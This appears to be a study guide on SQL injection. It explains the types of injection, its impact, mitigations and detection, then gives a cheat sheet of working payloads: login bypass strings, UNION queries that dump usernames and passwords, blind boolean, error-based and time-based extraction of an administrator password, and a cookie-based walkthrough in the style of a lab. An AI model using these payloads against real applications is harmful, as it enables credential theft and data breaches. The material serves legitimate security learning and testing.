
=> SQL Injection

- SQL Injection (SQLi) is a web security vulnerability in which an attacker exploits flaws in an application by injecting malicious SQL (Structured Query Language) code into input fields. This can allow the attacker to interfere with the application's database queries, enabling unauthorized access to view, modify, or delete sensitive data.
- SQL Injection occurs when user input is not properly validated or sanitized and is directly inserted into a SQL query. Since most web applications interact with databases using SQL, improperly handled input can allow attackers to craft malicious input that alters the intended structure and behavior of the query.
- SQL Injection (SQLi) can have severe consequences, enabling attackers to:
    - Bypass authentication mechanisms
    - View sensitive data (e.g., usernames, passwords, personal information)
    - Modify or delete database records
    - Execute administrative operations on the database
    - Extract entire databases
    - In severe cases, gain control of the underlying server or system
- Why SQL Injection Happens:
    - Lack of Input Validation: User inputs are directly used in SQL queries without sanitization.
    - Dynamic SQL Queries: Constructing SQL strings manually based on user input.
    - Improper Use of APIs: Not using parameterized queries or ORM methods properly.
    - Lack of Awareness or Security Practices: Developers not following secure coding standards.

Types of SQLi:
- In-Band SQLi: Attacker injects SQL and immediately sees results in the application’s response (e.g., input ' OR '1'='1 alters the query to always return true, bypassing authentication).
    - Error-Based: Attacker causes database errors to gain information from error messages (e.g., injecting ' UNION SELECT NULL, version() -- reveals the database version through an error).
    - Union-Based: Attacker uses the SQL UNION operator to combine results from the original query with malicious query results, retrieving data directly (e.g., ' UNION SELECT username, password FROM users -- appends user data to the query output).
- Blind SQLi: No direct output; attacker infers data by observing application behavior (e.g., using true/false queries to check if the first letter of username is ‘A’, with different page responses).
    - Boolean-Based: Uses conditional queries causing different responses based on true/false evaluation (e.g., username = 'admin' AND 1=1 returns a normal page, while username = 'admin' AND 1=0 causes an error or different behavior).
    - Time-Based: Uses delays to determine if conditions are true by measuring server response times (e.g., query causes a 5-second delay if the first password character is ‘a’).
- Out-of-Band SQLi: When direct or blind injection isn’t possible, attacker uses external channels like DNS or HTTP requests to receive data (e.g., database triggers a DNS lookup to attacker’s server, leaking data externally).

Impact of SQL Injection:
- Data Theft (PII, credentials, financial info)
- Account takeover
- Website defacement
- Complete system compromise (in some cases)
- Regulatory penalties (e.g., under GDPR)

Mitigate SQL Injection:
- Use Prepared Statements (Parameterized Queries): To ensure user input is treated as data, not code.
- Use ORM (Object Relational Mapping) Tools: Tools like Sequelize, Django ORM, Hibernate manage SQL safely.
- Input Validation and Sanitization: Validate and sanitize all inputs through input validation and escaping.
- Whitelist Input Validation: Only allow expected characters and patterns (e.g., for email, phone numbers).
- Escape User Input Carefully: If you must use dynamic SQL, escape input correctly (not recommended over parameterized queries).
- Limit Database Privileges (Principle of least privilege): The application’s DB user should have only necessary permissions (e.g., read-only where needed).
- Error Handling: Don’t expose database errors to users (disable detailed DB error messages in production).
- Use Web Application Firewalls (WAFs): Can block known attack signatures and patterns.
- Regular Security Testing: Perform vulnerability scans, code audits, and pen-tests.

Detect SQLi Vulnerabilities:
- You can detect SQL injection manually using a systematic set of tests against every entry point in the application. To do this, you would typically submit:
- The single quote character ' and look for errors or other anomalies.
- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
- Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses.
- Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
- OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.

SQL injection in different parts of the query:
- Most SQL injection vulnerabilities occur within the WHERE clause of a SELECT query. Most experienced testers are familiar with this type of SQL injection.
- In UPDATE statements, within the updated values or the WHERE clause.
- In INSERT statements, within the inserted values.
- In SELECT statements, within the table or column name.
- In SELECT statements, within the ORDER BY clause.

SQLi Payloads:
- Skipping further query by commenting: Abcd'--
- Skipping all conditions: Abcd'+OR+1=1--
- Bypass login with username: user'--

In-Band SQLi - UNION:
- Key requirements for UNION query to work:
    - The individual queries must return the same number of columns
    - The data types in each column must be compatible between the individual queries
- We use NULL as the values returned from the injected SELECT query because the data types in each column must be compatible between the original and the injected queries. NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.
- Determining the number of columns required:
    - Injecting series of ORDER BY clauses and incrementing the specified column index until an error occurs (out of range of the number): ' ORDER BY 1--
    - Submitting series of UNION SELECT payloads specifying a different number of null values: ' UNION SELECT NULL,NULL--
- Finding columns with a useful data type:
    - After determining the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of UNION SELECT payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:
    - ' UNION SELECT 'a',NULL,NULL,NULL--
    - ' UNION SELECT NULL,'a',NULL,NULL--
    - ' UNION SELECT NULL,NULL,'a',NULL--
    - ' UNION SELECT NULL,NULL,NULL,'a'--
- UNION attack, retrieving data from other tables: ' UNION SELECT username, password FROM users--
- Retrieving multiple values within single column: ' UNION SELECT username || '~' || password FROM users--
- Examining the database:
    - Querying the database type and version: ' UNION SELECT @@version--
        - Microsoft, MySQL: SELECT @@version
        - Oracle: SELECT banner FROM v$version
        - PostgreSQL: SELECT version()
- Listing the contents of the database:
    - Query information_schema.tables view to list the tables in the database:
        - ' UNION SELECT * FROM information_schema.tables
        - ' UNION SELECT table_name, NULL FROM information_schema.tables--
    - Query information_schema.columns to list the columns in individual tables:
        - ' UNION SELECT * FROM information_schema.columns WHERE table_name = 'Users'
        - ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
    - Retrieve the columns from the table:
        - ' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--

Blind SQLi:
- Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
- Exploiting blind SQL injection by triggering conditional responses:
    - With true: ' AND '1'='1
    - With false: ' AND '1'='2
    - Veriry/confirm table user: ' AND (SELECT 'a' FROM users LIMIT 1)='a
    - Confirm user administrator exist in users table/column: ' AND (SELECT 'a' FROM users WHERE username='administrator')='a
    - Determine how many characters are in the password of the administrator user and test different password lengths:
        - ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
        - ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
        - ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
    - Test the character at each position to determine its value (Intruder): ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

Blind - Error-based SQLi:
- Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts. The possibilities depend on the configuration of the database and the types of errors you're able to trigger.
- Exploiting blind SQL injection by triggering conditional errors:
    - xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
    - xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
- Extracting sensitive data via verbose SQL error messages:
    - CAST() function: CAST((SELECT example_column FROM example_table) AS int)
    - An error-based SQL injection using the TrackingId cookie. Initially, appending a single quote reveals a verbose SQL error confirming the injection point: TrackingId=ogAZZfxtOKUELbuJ'
    - To fix the broken query, SQL comment characters are added: TrackingId=ogAZZfxtOKUELbuJ'--
    - Then, a basic payload is tested to confirm injection by using a CAST: TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
    - The error response guides a fix: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
    Next, the payload tries to extract data: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
    Due to truncation, the cookie value is shortened: TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
    - It fails due to multiple rows, so a LIMIT 1 is added: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
    - This leaks the first username: "administrator". The final step retrieves the password: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

Blind - Time-based SQLi:
- When SQL errors are handled gracefully and no error messages are shown, blind SQL injection can be exploited using time-based delays. By injecting conditions that cause deliberate delays (e.g., using SLEEP()), attackers can infer whether a condition is true or false based on the time taken for the HTTP response.
- Exploiting blind SQL injection by triggering time delays:
    - The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server:
    - The first of these inputs does not trigger a delay, because the condition 1=2 is false: '; IF (1=2) WAITFOR DELAY '0:0:10'--
    - The second input triggers a delay of 10 seconds, because the condition 1=1 is true: '; IF (1=1) WAITFOR DELAY '0:0:10'--
    - Retrieve data by testing one character at a time: '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
